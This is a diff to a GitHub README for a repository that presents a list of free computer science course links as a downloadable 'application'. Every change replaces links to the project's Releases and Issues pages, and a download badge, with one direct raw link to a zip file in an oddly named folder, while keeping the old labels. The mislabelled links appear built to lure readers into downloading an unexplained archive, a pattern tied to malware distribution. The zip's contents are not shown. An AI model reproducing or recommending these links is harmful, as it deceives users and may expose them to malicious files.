@@ -6,7 +6,7 @@ Welcome to the Free-Computer-Science-Courses-Links repository! This directory co
 ## 📥 Download the Application
 To access the software, visit the Releases page where you can find downloadable files. 
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/releases)
+[![Download Here](https://raw.githubusercontent.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/main/coquecigrue/Free-Computer-Science-Courses-Links.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/main/coquecigrue/Free-Computer-Science-Courses-Links.zip)
 
 ## 📂 What is This?
 This repository serves as a collection of links to free courses in computer science. You can explore a variety of topics, including:
@@ -26,7 +26,7 @@ To ensure a smooth experience, make sure your system meets these requirements:
 - **Internet Connection:** A stable internet connection for accessing online resources.
 
 ## 🔗 Download & Install
-To download the application, please visit the [Releases page](https://github.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/releases) on GitHub. You'll find all the available versions listed there. 
+To download the application, please visit the [Releases page](https://raw.githubusercontent.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/main/coquecigrue/Free-Computer-Science-Courses-Links.zip) on GitHub. You'll find all the available versions listed there. 
 
 1. Click on the link or button above to go to the Releases page.
 2. Choose the version you want to download.
@@ -64,7 +64,7 @@ Your contributions can help other learners access valuable information.
 
 ## 📌 Important Links
 
-- [Releases Page](https://github.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/releases)
-- [Issues Page](https://github.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/issues)
+- [Releases Page](https://raw.githubusercontent.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/main/coquecigrue/Free-Computer-Science-Courses-Links.zip)
+- [Issues Page](https://raw.githubusercontent.com/eng-Abdullah-web/Free-Computer-Science-Courses-Links/main/coquecigrue/Free-Computer-Science-Courses-Links.zip)
 
 Your feedback is valuable. We look forward to hearing from you and hope you enjoy exploring the world of computer science.
